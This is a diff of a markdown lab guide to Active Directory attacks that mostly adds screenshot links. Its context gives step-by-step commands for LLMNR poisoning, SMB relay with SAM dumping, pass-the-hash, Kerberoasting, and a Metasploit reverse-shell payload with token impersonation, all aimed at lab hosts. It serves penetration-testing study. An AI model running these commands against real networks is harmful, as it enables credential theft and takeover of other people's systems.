@@ -1,3 +1,5 @@
+#Important Active Directory Network Attacks
+
 1. LLMNR/NBT-NS poisoning
 
 Link Local Multicast Name Resolution and NetBIOS Name Service are alternate ways to identify hosts in the network when DNS fails.
@@ -24,7 +26,6 @@ We can crack this NTLMv2 hash with a tool such as hashcat to get the password of
 1.  Keep kali, SIMLAB-DC and SIMLAB-PC1 on at the same time.
 2.  Run Responder on the kali linux terminal with the command:
 
-    `[responder_command]`
 
     ```bash
     sudo responder -I eth0 -dvw
@@ -35,15 +36,15 @@ We can crack this NTLMv2 hash with a tool such as hashcat to get the password of
     * `-w`: Start the WPAD rogue proxy server
     * `-v`: increases verbosity of output
 
-    `[responder image]`
+    ![responder image](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/responder_command.jpg)
 
 3.  From the SIMLAB-PC1 system, go to file explorer and type `\\<IP address of the kali machine>`.
 
-    `[pointing to kali IP image ]`
+    ![pointing to kali IP image](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/pointing_to_kali_LLMNR_poisoning.jpg)
 
 4.  When we check the terminal with Responder running on Kali, we see that the SIMLAB-PC1 system has sent over the username and NTLMv2 hash of the account running on it.
 
-    `[responder_output]`
+    ![responder_output](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/responder_output.jpg)
 
     This hash is of NTLMv2 type, therefore we have to use the Hashcat module `5600` to crack it.
     Add the hash to a `.txt` file and use the following Hashcat command on Kali to crack the password:
@@ -54,7 +55,7 @@ We can crack this NTLMv2 hash with a tool such as hashcat to get the password of
 
     We can use a common wordlist like `rockyou.txt` or even tailor a wordlist specifically for the victim machine.
 
-    `[LLMNR hash crack]`
+    ![LLMNR hash crack](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/LLMNR_hash_crack.jpg)
 
 ---
 
@@ -85,7 +86,7 @@ SMB relay attack is a man-in-the-middle attack where the attacker intercepts and
 
 3.  Edit the Responder config file located at `/etc/responder/Responder.conf` and set the SMB and HTTP settings to `Off` as we are not going to poison the SMB requests, we are just relaying the request.
 
-    `[config_file_edit]`
+    ![config_file_edit](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/responder_config_file_edit.jpg)
 
 4.  Start Responder in a Kali terminal with the following command. We should see SMB and HTTP to be off.
 
@@ -93,7 +94,7 @@ SMB relay attack is a man-in-the-middle attack where the attacker intercepts and
     responder -I eth0 -dwv
     ```
 
-    `[responder_smb_relay]`
+    ![responder_smb_relay](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/responder_smb_relay.jpg)
 
 5.  Add the IP address of the SIMLAB-PC2 system to a file named `targets.txt`. SIMLAB-PC2 is the victim machine here as if we recall correctly the `simlabuser1` account is a local admin on both SIMLAB-PC1 and SIMLAB-PC2.
 6.  Run the `ntlmrelayx` tool with the `targets.txt` as an argument to set up the relay that will occur when an authentication request is sent from SIMLAB-PC1 to Kali, which will then be relayed to SIMLAB-PC2.
@@ -102,12 +103,12 @@ SMB relay attack is a man-in-the-middle attack where the attacker intercepts and
     ntlmrelayx.py -tf targets.txt -smb2support
     ```
 
-    `[ntlmrelayx smb relay]`
+    ![ntlmrelayx smb relay](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/ntlm_relayx_smb_relay.jpg)
 
 7.  When the auth request from SIMLAB-PC1 is sent to Kali when `ntlmrelayx` and Responder are running, the SMB relay attack with the `ntlmrelayx` tool dumps the SAM database of the SIMLAB-PC2 system. The usernames and password hashes of accounts on a Windows system are stored in the SAM file - note that the hashes dumped here are local account hashes and are of the NTLMv1 format.
 
-    `[smb_relay_to_kali]`
-    `[smb_relay_sam_dump]`
+    ![smb_relay_to_kali](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/smb_relay_to_kali.jpg)
+    ![smb_relay_sam_dump](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/smb_relay_sam_dump.jpg)
 
     NTLM v1 hashes can be cracked with Hashcat using the module number `1000` with an appropriate wordlist.
 
@@ -115,7 +116,7 @@ SMB relay attack is a man-in-the-middle attack where the attacker intercepts and
     hashcat -m 1000 hash.txt <path to the wordlist>
     ```
 
-    `[smb_relay_hash_crack]`
+    ![smb_relay_hash_crack](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/smb_relay_hash_crack.jpg)
 
 8.  We can even gain an interactive SMB shell with this attack by using the `-i` option in the `ntlmrelayx` tool like so:
 
@@ -127,7 +128,7 @@ SMB relay attack is a man-in-the-middle attack where the attacker intercepts and
 
     The `ntlmrelayx` tool sets up the interactive SMB shell on one of the ports in our Kali machine, which we can connect to and run various commands on the victim system - we can perform operations like changing the password of the user account, getting and putting files onto the system, etc.
 
-    `[ntlm_relayx_shell]`
+    ![ntlm_relayx_shell](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/ntlm_relayx_interactive_shell.jpg)
 
     We can also run only specific commands using the `-c` option in the command. This command can even execute a reverse shell payload which can give us shell access to the machine. The `ntlmrelayx` tool comes with more such functionalities; read its documentation for understanding those functionalities.
 
@@ -152,7 +153,7 @@ Pass the password attack is an attack where we try valid credentials of a user a
 
     As `simlabuser1` is a local admin on both SIMLAB-PC2 and SIMLAB-PC1, this attack works on SIMLAB-PC2.
 
-    `[pass_the_password_cme]`
+    ![pass_the_password_cme](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/pass_the_password_cme.jpg)
 
 2.  Now that we know that the `simlabuser1` account exists on SIMLAB-PC2 as well, we can use `crackmapexec` again to dump the SAM database on SIMLAB-PC2 to view all the local user account hashes present on the system.
 
@@ -160,7 +161,7 @@ Pass the password attack is an attack where we try valid credentials of a user a
     sudo crackmapexec smb 192.168.0.226 -u simlabuser1 -d SIMLAB.local -p Password1 --sam
     ```
 
-    `[pass_the_password_samdump]`
+    ![pass_the_password_samdump](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/pass_the_password_samdump.jpg)
 
 3.  We can now use `psexec.py` with the knowledge that the account exists on SIMLAB-PC2 and gain a shell on the system like so:
 
@@ -168,7 +169,7 @@ Pass the password attack is an attack where we try valid credentials of a user a
     psexec.py simlab/simlabuser1:Password1@192.168.0.226
     ```
 
-    `[pass_the_password_psexecshell]`
+    ![pass_the_password_psexecshell](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/pass_the_password_psexecshell.jpg)
 
 ---
 
@@ -192,7 +193,7 @@ It is clear that the NTLM hash does not need to be cracked for this attack to be
     sudo python /usr/share/doc/python3-impacket/examples/secretsdump.py simlab/simlabuser1:Password1@192.168.0.122
     ```
 
-    `[secretsdump.py passthehash]`
+    ![secretsdump.py passthehash](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/secretsdump.py_passthehash.jpg)
 
     We see in the output of this command that “`64f12cddaa88057e06a81b54e73b949b`” is the NTLMv1 hash of the `simlabuser1` account.
 
@@ -202,7 +203,7 @@ It is clear that the NTLM hash does not need to be cracked for this attack to be
     sudo crackmapexec smb 192.168.0.1/24 -u "simlab user1" -H 64f12cddaa88057e06a81b54e73b949b --local-auth
     ```
 
-    `[pass_the_hash]`
+    ![pass_the_hash](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/pass_the_hash.jpg)
 
 3.  Similarly, we can also use the hash to gain shell access over another system using the `psexec` tool.
 
@@ -237,7 +238,7 @@ Kerberoasting is a post-exploitation attack in Microsoft Active Directory enviro
     python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py simlab.local/simlabuser1:Password1 -dc-ip 192.168.0.217 -request
     ```
 
-    `[tgs_ticket_kerberoasting]`
+    ![tgs_ticket_kerberoasting](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/tgs_ticket_kerberoasting.jpg)
 
 2.  Crack the TGS ticket using Hashcat with the module number `13100` and an appropriate wordlist to get the service account password and escalate privileges.
 
@@ -346,7 +347,7 @@ We will use the Metasploit framework to perform the attack.
     msf6 > search exploit/windows/smb/psexec
     ```
 
-    `[psexec options]`
+    ![psexec options](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/psexec_options%20.jpg)
 
 3.  Type `use 0` to use the module.
     Set the arguments of:
@@ -358,7 +359,7 @@ We will use the Metasploit framework to perform the attack.
     * `payload` to `windows/x64/meterpreter/reverse_tcp`
     * `lhost` to `eth0`
 
-    `[token_impersonation_arguments]`
+    ![token_impersonation_arguments](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/token_impersonation_metasploit_arguments.jpg)
 
 4.  Enter `exploit` and hit enter to gain a `psexec` SMB shell on the SIMLAB-PC1 system as the `simlabuser1` user.
 5.  Load the `incognito` tool which is used for token impersonation from the Meterpreter shell by typing the following command:
@@ -369,7 +370,7 @@ We will use the Metasploit framework to perform the attack.
 
 6.  Use the `help` command from the Meterpreter shell and we will see the different actions that we can perform using the `incognito` tool.
 
-    `[incognito_commands]`
+    ![incognito_commands]()
 
 7.  Use the `list_tokens` command with the `-u` option to view the tokens of user accounts on the system that are available to be impersonated.
 
@@ -377,7 +378,7 @@ We will use the Metasploit framework to perform the attack.
     meterpreter> list_tokens -u
     ```
 
-    `[available_tokens_for_impersonation]`
+    ![available_tokens_for_impersonation](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/available_tokens_for_impersonation.jpg)
 
     If the administrator account has recently logged on to the SIMLAB-PC1 system, we will see that the token of the administrator account is available to be impersonated by us in the list.
 
@@ -387,7 +388,7 @@ We will use the Metasploit framework to perform the attack.
     meterpreter> impersonate_token simlab\\\\administrator
     ```
 
-    `[token_impersonation_attack]`
+    ![token_impersonation_attack](https://github.com/whoismithun/Active-Directory-Network-Emulation/blob/e0ccba469f0663fbf66b1c2186a57b10a6ba9d96/attack_images/token_impersonation_attack.jpg)
 
     After running this command, we can see that we have successfully impersonated the administrator domain account on this system and can perform actions as this account now.
 
